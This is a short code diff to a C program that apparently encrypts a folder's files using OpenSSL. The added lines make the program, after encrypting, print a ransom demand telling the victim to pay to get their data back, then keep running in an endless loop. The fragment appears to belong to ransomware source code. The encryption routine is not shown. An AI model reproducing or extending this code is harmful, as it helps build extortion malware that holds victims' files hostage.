@@ -170,6 +170,17 @@ int main(int argc, char *argv[])
     handle_folder(key, action, target_fd);
 
     close_openssl();
+
+    /* In case of encryption, keep the program running. */
+    if (action == ENCRYPT)
+    {
+        printf("You have been powned, please pay in order to get your data back!\n");
+        while (1)
+        {
+            sleep(2);
+        }
+    }
+
     free(key);
 
     return 0;
